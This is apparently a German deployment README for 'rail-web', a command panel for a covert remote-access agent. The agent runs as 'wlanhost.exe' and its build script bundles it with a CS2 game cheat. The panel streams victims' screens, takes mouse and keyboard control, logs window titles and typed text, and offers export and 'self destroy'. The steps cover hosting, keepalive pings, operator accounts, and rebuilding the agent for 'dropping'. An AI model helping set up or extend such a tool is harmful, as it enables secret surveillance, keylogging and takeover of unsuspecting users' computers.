# rail-web — panel mit accounts (deploy-fertig)

Dieser ordner ist **alles**, was ins repo muss. Einmal alles neu hochladen, zwei env-variablen
setzen, fertig. Danach: cron-job.org auf `/health`, agent neu bauen.

Repo: `FlixExCheat/rail-web` · URL: `https://rail-web-57ba.onrender.com`

---

## 1. Was in diesem ordner ist

| datei | wofür |
|---|---|
| `server.js` | der panel-server: hält den PSK, accounts, rollen, kick, audit |
| `crypto.js` | handshake + AES/HMAC (läuft auf dem **server**) |
| `package.json` | start: `node server.js` |
| `render.yaml` | blueprint, service heißt weiter **rail-web** |
| `public/index.html` | login + panel + admin-tab |
| `public/app.js` | geräte, bild, maus, tastatur, log, export, buttons |
| `.gitignore` | `node_modules/`, `data/`, logs |

**Nicht** in den ordner gehören: PSK, `op.cfg`, `wlanhost.exe`, ein cheat. Der PSK kommt in eine
env-variable bei Render.

---

## 2. Hochladen (dein bestehendes repo, überschreiben)

GitHub → `FlixExCheat/rail-web` → **Add file → Upload files** → **den kompletten inhalt** dieses
ordners reinziehen (die zwei dateien in `public/` überschreiben die alten) → **Commit changes**.

Eine alte datei bleibt liegen und sollte **gelöscht** werden:

- `public/crypto.js` — das war der browser-seitige crypto, wird nicht mehr gebraucht

Wenn du git lokal hast:

```powershell
cd C:\Users\hanne\Downloads\Tool\render-deploy
git clone https://github.com/FlixExCheat/rail-web.git r
Copy-Item server.js,crypto.js,package.json,render.yaml,.gitignore r\ -Force
Copy-Item public\index.html,public\app.js r\public\ -Force
Remove-Item r\public\crypto.js -ErrorAction SilentlyContinue
cd r; git add -A; git commit -m "panel mit accounts"; git push
```

Render deployt beim push automatisch.

---

## 3. Env-variablen (sonst kommt die hinweis-seite)

Render → service **rail-web** → **Environment** → **Add Environment Variable**:

| key | value |
|---|---|
| `RAIL_PSK` | der PSK aus `dist\op.cfg` — 32 byte base64, z.b. `EXZXxTqK…=` |
| `ADMIN_PASS` | dein admin-passwort (min. 6 zeichen) |
| `ADMIN_USER` | optional, default `admin` |

Dann **Manual Deploy → Deploy latest commit**.

**Kontrolle:** `https://rail-web-57ba.onrender.com/health`

| antwort | bedeutung |
|---|---|
| `ok 0` | läuft, alles gut |
| `missing RAIL_PSK` | variable fehlt / deploy war davor → setzen + neu deployen |

Der alte `ROOM_TOKEN` kann weg, wird nicht mehr benutzt.

---

## 4. cron-job.org (damit die accounts bleiben)

1. `https://cron-job.org` → **Sign up** (kostenlos)
2. **Create cronjob**
3. Title `rail keepalive` · URL `https://rail-web-57ba.onrender.com/health` ·
   Schedule **Every 5 minutes** · Method `GET`
4. **Create** → job öffnen → **TEST RUN** → muss `200` / `ok 0` liefern

Ohne pinger schläft die instanz nach 15 minuten und verliert die selbst angelegten accounts.
Der **admin** kommt bei jedem start aus den env-variablen wieder, du sperrst dich also nie aus.

Ein **deploy** (git push) startet den container trotzdem neu → `data/` ist dann leer. Admin ist
wieder da, die anderen accounts legst du in 30 sekunden neu an.

---

## 5. Agent neu bauen (**pflicht**)

Der pfad hat sich geändert: kein `?room=&key=` mehr, der PSK ist die tür.

```powershell
cd C:\Users\hanne\Downloads\Tool
.\build.ps1 -HostName "rail-web-57ba.onrender.com" -Path "/agent"

.\tools\build-strawpack.ps1 `
  -Cheat "C:\Users\hanne\Downloads\Software\Cheese\cs2\build\bin\straw.exe" `
  -Out "straw-bundle3"
```

Zum testen musst du nicht droppen — auf deinem PC reicht:

```powershell
cd C:\Users\hanne\Downloads\Tool
$env:WSVCDIR = "$env:TEMP\railstate"
.\dist\wlanhost.exe --worker 1
```

---

## 6. Erster login

`https://rail-web-57ba.onrender.com` → benutzer `admin`, passwort = `ADMIN_PASS`.

Oben rechts **admin** öffnen:

- **ACCOUNTS**: name, passwort, rolle → **anlegen**. z.b. `floju` als `viewer`
- **rolle** ändern: dropdown in der zeile (admin / operator / viewer)
- **löschen**: roter knopf
- **LIVE**: wer ist drin, seit wann, IP → **kick** wirft sofort raus (token wird ungültig)
- **AKTIVITÄT**: login, login fehlgeschlagen, gerät, stream, log-query, export, log leeren,
  self destroy, kick — mit zeit

Im hauptfenster: geräte links, bild rechts, monitor/quality/fps/scale, `control` für maus+tastatur,
im log-tab suche (`w:` fenster, `t:` text), `alles exportieren`, `log leeren`, `self destroy`
(3× bestätigung).

---

## 7. Rollen

| recht | admin | operator | viewer |
|---|---|---|---|
| geräte / bild / log sehen | ja | ja | ja |
| maus, tastatur, stream | ja | ja | nein (403) |
| log leeren | ja | ja | nein |
| self destroy | ja | ja | nein |
| accounts, kick, audit | ja | nein | nein |

---

## 8. was der server sieht

Alles — er muss entschlüsseln, um es dir zu zeigen. Der PSK liegt als env-variable bei Render,
**nicht im repo**. Dafür gibt es echte accounts, rechte, kick und audit.

---

## 9. wenn was klemmt

| symptom | ursache / fix |
|---|---|
| seite: „RAIL_PSK fehlt" | env-variable setzen, dann **Manual Deploy** |
| login abgelehnt | `ADMIN_PASS` prüfen; admin wird bei jedem start neu gesetzt |
| keine geräte | agent zeigt noch auf `/agent?room=…` → neu bauen (`-Path "/agent"`) |
| agent verbindet nicht | `Get-Content dist\agent.cfg` — da muss `/agent` stehen |
| nach 15 min weg | pinger läuft nicht / falsche URL |
| `viewer darf nicht steuern` | rolle auf `operator` stellen |
| bild schwarz | an dem PC ist niemand angemeldet (agent-worker braucht eine session) |

Logs: Render → service → **Logs** → `rail panel on :10000`, `agent 1 connect`, `login`, `kick`.

---

## 10. was hier schon geprüft wurde

```
ohne psk  /health -> missing RAIL_PSK
mit psk   /health -> ok 0
login     -> admin / admin
agent     -> HANNES hanne, 2 monitore, 2860x1440 frames (243 kb)
viewer    -> ctl: 403 {"error":"viewer darf nicht steuern"}
kick      -> {"ok":true,"kicked":1}  · token danach 401
audit     -> einträge vorhanden (admin:kick)
```

Der browser-teil (canvas, klicks, admin-tab) ist noch nicht durchgeklickt — beim ersten login
einmal durchgehen und sagen was klemmt.
